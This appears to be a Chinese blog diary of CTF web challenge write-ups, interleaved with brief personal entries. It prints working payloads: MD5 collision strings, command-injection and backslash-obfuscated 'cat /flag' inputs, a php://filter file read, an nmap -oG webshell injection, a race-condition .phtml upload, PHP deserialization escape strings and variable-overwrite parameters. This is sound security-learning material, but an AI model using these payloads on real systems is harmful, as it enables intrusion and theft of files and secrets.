&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>php中==的比较的时候会把开头为0e的数值比较为相同  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">==是转换后比较  ！==和===  这俩是啥样就是啥样</span><br></pre></td></tr></table></figure>
<p>===则不会相同</p>
<p>这里对传入的值限定了是<strong>字符串</strong> </p>
<p>md5判断出是<strong>===</strong></p>
<p>这样一来既无法用数组绕过,又无法用0e绕过</p>
<p>必须是真正的碰撞</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">00</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%<span class="number">55</span>%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2&amp;b=%<span class="number">4</span>d%c9%<span class="number">68</span>%ff%<span class="number">0</span>e%e3%<span class="number">5</span>c%<span class="number">20</span>%<span class="number">95</span>%<span class="number">72</span>%d4%<span class="number">77</span>%<span class="number">7</span>b%<span class="number">72</span>%<span class="number">15</span>%<span class="number">87</span>%d3%<span class="number">6</span>f%a7%b2%<span class="number">1</span>b%dc%<span class="number">56</span>%b7%<span class="number">4</span>a%<span class="number">3</span>d%c0%<span class="number">78</span>%<span class="number">3</span>e%<span class="number">7</span>b%<span class="number">95</span>%<span class="number">18</span>%af%bf%a2%<span class="number">02</span>%a8%<span class="number">28</span>%<span class="number">4</span>b%f3%<span class="number">6</span>e%<span class="number">8</span>e%<span class="number">4</span>b%<span class="number">55</span>%b3%<span class="number">5</span>f%<span class="number">42</span>%<span class="number">75</span>%<span class="number">93</span>%d8%<span class="number">49</span>%<span class="number">67</span>%<span class="number">6</span>d%a0%d1%d5%<span class="number">5</span>d%<span class="number">83</span>%<span class="number">60</span>%fb%<span class="number">5</span>f%<span class="number">07</span>%fe%a2</span><br></pre></td></tr></table></figure>
<p>又过滤了大部分命令</p>
<p>用\混淆读出flag</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd=ca\t%<span class="number">20</span>/f\lag</span><br><span class="line">cmd=/bin/c\at%<span class="number">20</span>/flag</span><br><span class="line">cmd=sort%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>
<h2 id="ACTF2020-新生赛-Include"><a href="#ACTF2020-新生赛-Include" class="headerlink" title="[ACTF2020 新生赛]Include"></a>[ACTF2020 新生赛]Include</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
<p>直接读出源码 base64解码得到flag</p>
<h1 id="2020-2-13"><a href="#2020-2-13" class="headerlink" title="2020/2/13"></a>2020/2/13</h1><h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>上传题目</p>
<p> 一开始前端上传直接被拦住了,于是禁用了js,加了GIF头，还是被拦住了</p>
<p>后来发现是黑名单题目</p>
<p>用.phtml绕过</p>
<p>访问的时候消失了,明白了是竞争上传</p>
<p>开着burpsuite,线程调到1，一直发包</p>
<p>用蚁剑连接,在根目录下得到flag</p>
<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>做完这个题之后感觉很罪恶</p>
<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;cat /flag</span><br></pre></td></tr></table></figure>
<h1 id="2020-2-14"><a href="#2020-2-14" class="headerlink" title="2020/2/14"></a>2020/2/14</h1><h2 id="研究ce"><a href="#研究ce" class="headerlink" title="研究ce"></a>研究ce</h2><h1 id="2020-2-15"><a href="#2020-2-15" class="headerlink" title="2020/2/15"></a>2020/2/15</h1><h2 id="制作了mirror修改器"><a href="#制作了mirror修改器" class="headerlink" title="制作了mirror修改器"></a>制作了mirror修改器</h2><h1 id="2020-2-15-1"><a href="#2020-2-15-1" class="headerlink" title="2020/2/15"></a>2020/2/15</h1><h2 id="学习ce由浅入深"><a href="#学习ce由浅入深" class="headerlink" title="学习ce由浅入深"></a>学习ce由浅入深</h2><h1 id="2020-2-17"><a href="#2020-2-17" class="headerlink" title="2020/2/17"></a>2020/2/17</h1><h2 id="BUUCTF-2018-Online"><a href="#BUUCTF-2018-Online" class="headerlink" title="[BUUCTF 2018]Online"></a>[BUUCTF 2018]Online</h2><p>做题的时候都快被自己菜哭了,多亏了树哥的耐心讲解.</p>
<p>原来是因为我没分清楚linux命令行和php命令的echo</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> system(<span class="string">"nmap -T5 -sT -Pn --host-timeout 2 -F "</span>.$host);</span><br></pre></td></tr></table></figure>
<p>因为源码中的system相当于在shell里执行命令</p>
<p>在linux默认情况下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo  ''\\'' \&lt;\?php \`cat /flag\` \?\&gt; '\\'''</span><br><span class="line"></span><br><span class="line">\ &lt;?php `cat /flag` ?&gt; \\</span><br></pre></td></tr></table></figure>
<p>并不会影响php的解析</p>
<p>做法：</p>
<p>1.把源码拿到本地 </p>
<p>2.自己测试输出结果 </p>
<p>3.然后本地测试命令或者echo</p>
<p><img src="https://i.loli.net/2020/02/22/ih9ntKR7OrlZ1Nf.png" alt="image-20200217230532145.png"></p>
<p>nmap -oG参数可以实现写入木马</p>
<p>经过测试发现</p>
<p>‘shel’这样的格式会绕过转义</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:?host=<span class="string">'&lt;?php echo `cat /flag` ?&gt; -oG 3.php '</span></span><br></pre></td></tr></table></figure>
<p>相当于直接拼接了命令 并没有被转义</p>
<p>测试的时候nmap执行命令不识别\ \</p>
<p>所以构造出来的\必须在后面等待停止</p>
<p><img src="https://i.loli.net/2020/02/22/FWfrxCd1JDnE3pI.png" alt="image-20200217225057695.png"></p>
<p><img src="https://i.loli.net/2020/02/22/KFfbQqul4DHaX67.png" alt="image-20200217225111170.png"></p>
<p><img src="https://i.loli.net/2020/02/22/qEcFS8zm64WioLv.png" alt="image-20200217225205287.png"></p>
<p>参考：<a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md" target="_blank" rel="noopener">https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day5/files/README.md</a></p>
<p><a href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/" target="_blank" rel="noopener">http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/</a></p>
<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>题目是备份文件</p>
<p>直接奔着swp bak .git去</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://51c3d582-1316-42f0-b07d-9a9501e4843f.node3.buuoj.cn/index.php.bak</span><br></pre></td></tr></table></figure>
<p>index.php可以下载</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">"flag.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'key'</span>])) &#123;</span><br><span class="line">    $key = $_GET[<span class="string">'key'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric($key)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"Just num!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $key = intval($key);</span><br><span class="line">    $str = <span class="string">"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3"</span>;</span><br><span class="line">    <span class="keyword">if</span>($key == $str) &#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Try to find out source file!"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>int传入的key 弱类型比较 str会被转化为123</p>
<p>所以传入key=123就可以了</p>
<h1 id="2020-2-18"><a href="#2020-2-18" class="headerlink" title="2020/2/18"></a>2020/2/18</h1><h2 id="没记得做了什么事情"><a href="#没记得做了什么事情" class="headerlink" title="没记得做了什么事情"></a>没记得做了什么事情</h2><h1 id="2020-2-19"><a href="#2020-2-19" class="headerlink" title="2020/2/19"></a>2020/2/19</h1><h2 id="购买了-Wallpaper-Engine-搞起了动态桌面。"><a href="#购买了-Wallpaper-Engine-搞起了动态桌面。" class="headerlink" title="购买了 Wallpaper Engine ,搞起了动态桌面。"></a>购买了 Wallpaper Engine ,搞起了动态桌面。</h2><h1 id="2020-2-20"><a href="#2020-2-20" class="headerlink" title="2020/2/20"></a>2020/2/20</h1><h2 id="王者荣耀上到了星耀段位"><a href="#王者荣耀上到了星耀段位" class="headerlink" title="王者荣耀上到了星耀段位"></a>王者荣耀上到了星耀段位</h2><h1 id="2020-2-21"><a href="#2020-2-21" class="headerlink" title="2020/2/21"></a>2020/2/21</h1><h2 id="0CTF-2016-piapiapia"><a href="#0CTF-2016-piapiapia" class="headerlink" title="[0CTF 2016]piapiapia"></a>[0CTF 2016]piapiapia</h2><p>这题实在是妙,同时也对我这个菜鸡进行了蹂躏。</p>
<p>首先打开页面，只有登录页面，扫描一下。</p>
<p>扫出一个<a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></p>
<p>是泄露的源码,大致看了一下</p>
<p>config.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">	$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">	$config[<span class="string">'password'</span>] = <span class="string">''</span>;</span><br><span class="line">	$config[<span class="string">'database'</span>] = <span class="string">''</span>;</span><br><span class="line">	$flag = <span class="string">''</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>flag应该是在源文件里的</p>
<p>然后把源码都拖到Seay里审计</p>
<p><img src="https://i.loli.net/2020/02/22/XpPhWNkj4fGDzQ3.png" alt="image-20200221231037274.png"></p>
<p>看到第三个可能存在任意文件的读取漏洞,而且上面的语句还有个反序列化</p>
<p>是存在于profile里面的</p>
<p><img src="https://i.loli.net/2020/02/22/bjpu4tr5UzICmKO.png" alt="image-20200221231120812.png"></p>
<p>然后就重点关注这个被反序列化的$profile</p>
<p>全局搜索一下,class.php里查到了$profile的发源地,是在show_profile里的返回的对象,这里的 show_profile函数 是user类里的</p>
<p><img src="https://i.loli.net/2020/02/22/gEJxGMdD4e7FLqN.png" alt="image-20200221231307941.png"></p>
<p>然后就是update.php，这里我们可以上传文件,也就意味着我们可以任意构造</p>
<p><img src="https://i.loli.net/2020/02/22/YTQvxkN2qMXshJ3.png" alt="image-20200221232818938.png"></p>
<p>这里传进来信息和图片之后,会调用update_profile函数，就是对信息的一个更新和过滤</p>
<p><img src="https://i.loli.net/2020/02/22/tHZBonIA7EuQCDX.png" alt="image-20200221233335706.png"></p>
<p>调用filter对违禁字符变成hacker</p>
<p><img src="https://i.loli.net/2020/02/22/dTglyQbhMjU5kBP.png" alt="image-20200221233357885.png"></p>
<p>接下来就想办法对base64_encode读取图片那里进行利用</p>
<p>先在本地模拟一下上传文件那里序列化的过程</p>
<p><img src="https://i.loli.net/2020/02/22/TNWtlfuswy3j1k9.png" alt="image-20200221233852945.png"></p>
<p>理想结果是这样的,也就是如果能够造出这样的payload，就能够读到config.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"12345677777"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">13</span>:<span class="string">"123456@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;s:<span class="number">5</span>:<span class="string">"nihao"</span>;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>继续回到上传点</p>
<p><img src="https://i.loli.net/2020/02/22/z5TNdtBZVsWmh8p.png" alt="image-20200221234029257.png"></p>
<p>phone要求11位  email要求是邮箱的格式   nickname长度不能大于10  photo有size限制</p>
<p>这里利用nickname[]数组形式进行绕过</p>
<p>然后再nickname里构造payload读取config</p>
<p>把nickename内容变成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span><br></pre></td></tr></table></figure>
<p>但是当where被防火墙检测,会变成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker</span><br></pre></td></tr></table></figure>
<p>先在本地测试</p>
<p><img src="https://i.loli.net/2020/02/22/jeMU21NhaKpIlSH.png" alt="image-20200221234511044.png"></p>
<p>这里面where一共170位字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"12345677777"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">13</span>:<span class="string">"123456@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;s:<span class="number">170</span>:<span class="string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span>;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>变成hacker之后再来本地跑一下</p>
<p><img src="https://i.loli.net/2020/02/22/vTtRXF9oZsqY1f6.png" alt="image-20200221234701593.png"></p>
<p>hacker一共是204位字符串</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"12345677777"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">13</span>:<span class="string">"123456@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;s:<span class="number">204</span>:<span class="string">"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"</span>;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;</span><br></pre></td></tr></table></figure>
<p>如果我们传入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/22/GVkQozri8XYJ1uU.png" alt="image-20200221234908494.png"></p>
<p>这里变成了204位,这里的204位是读到了”;}s:5:”photo”;s:10:”config.php”;}</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"12345677777"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">13</span>:<span class="string">"123456@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;s:<span class="number">204</span>:<span class="string">"wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;<span class="string">";s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
<p>当where被替换成hacker,204位长度不变，但是读完最后一个hacker便结束了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"12345677777"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">13</span>:<span class="string">"123456@qq.com"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;s:<span class="number">204</span>:<span class="string">"hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;<span class="string">";s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
<p>剩下的;}s:5:”photo”;s:10:”config.php”;}便会被反序列化当作photo的内容,同时后面真正上传的东西被覆盖了</p>
<p><img src="https://i.loli.net/2020/02/22/uzcjoFdWL1ximZQ.png" alt="image-20200221235952406.png"></p>
<p>传进去之后访问profile.php</p>
<p>base64解码图片链接，看到的就是config.php的内容</p>
<p><a href="https://blog.csdn.net/zz_Caleb/article/details/96777110" target="_blank" rel="noopener">https://blog.csdn.net/zz_Caleb/article/details/96777110</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$profile = a:4:&#123;s:5:"</span>phone<span class="string">";s:11:"</span><span class="number">12345678901</span><span class="string">";s:5:"</span>email<span class="string">";s:8:"</span>ss@q.com<span class="string">";s:8:"</span>nickname<span class="string">";a:1:&#123;i:0;s:204:"</span>wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere<span class="string">"&#125;;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;s:39:"</span>upload/<span class="number">804</span>f743824c0451b2f60d81b63b6a900<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="2020年新春战疫网络安全公益赛"><a href="#2020年新春战疫网络安全公益赛" class="headerlink" title="2020年新春战疫网络安全公益赛"></a>2020年新春战疫网络安全公益赛</h2><p>没来得及写</p>
<h1 id="2020-2-22"><a href="#2020-2-22" class="headerlink" title="2020/2/22"></a>2020/2/22</h1><p>很饿，同时烦躁无比。</p>
<h2 id="BJDCTF2020-Mark-loves"><a href="#BJDCTF2020-Mark-loves" class="headerlink" title="[BJDCTF2020]Mark loves"></a>[BJDCTF2020]Mark loves</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 GitHack.py  http:<span class="comment">//9f97e6fe-6b0d-4029-9788-c2e8e415d7c0.node3.buuoj.cn/.git/</span></span><br></pre></td></tr></table></figure>
<p>扫描到了git泄露</p>
<p>在index.php里找到了关键代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123; </span><br><span class="line">    $$x = $y;             </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123; </span><br><span class="line">    $$x = $$y;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123; <span class="comment">//需要传入两个参数绕过</span></span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123; <span class="comment">//如果post没有传flag并且get也没有就输出</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123; <span class="comment">//如果get和post传入flag参数,传入的内容不能是flag=flag</span></span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure>
<p>这串语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果$a=1 $b=2</p>
<p>传入?a=b</p>
<p>就成了这样$x=a $y=b</p>
<p>$$x=$a=1</p>
<p>$$y=$b=2</p>
<p>根据代码分析的逻辑</p>
<p>三个if判断条件,未满足任何一个都会exit一个变量,因为有$$x的存在,我们想办法覆盖变量,然后故意不满足条件让他输出</p>
<p>如果需要利用第一个if</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;  </span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>想办法让$handsome=$flag</p>
<p>如果传入?handsome=flag&amp;flag=handsome    </p>
<p><strong>这里的$x和$y只会遍历第一组参数</strong></p>
<p><strong>第二组flag=handsome只是接收了一个参数 并没有被遍历</strong></p>
<p>这样的话$x=handsome $y=flag  </p>
<p>$_GET[‘flag’] === $x =handsome   且$x=handsome!=’flag’</p>
<p>成功输出已经被变量覆盖的$handsome</p>
<p>如果需要利用第二个if</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123; <span class="comment">//get和post之中必须有一个传入flag参数</span></span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想办法让$yds=$flag</p>
<p>post无法覆盖</p>
<p>用get覆盖</p>
<p>get传参?yds=flag</p>
<p>post可有可无(因为第一个if没有触发(没有传入flag)  第二个if只要没有flag参数就直接输出yds 与post已经没有关系,当然如果传post不能传flag参数,不然就满足条件绕过了。)</p>
<p>源码里出现了flag</p>
<p><img src="https://i.loli.net/2020/02/23/w9b5UhKTlGVRk7d.png" alt></p>
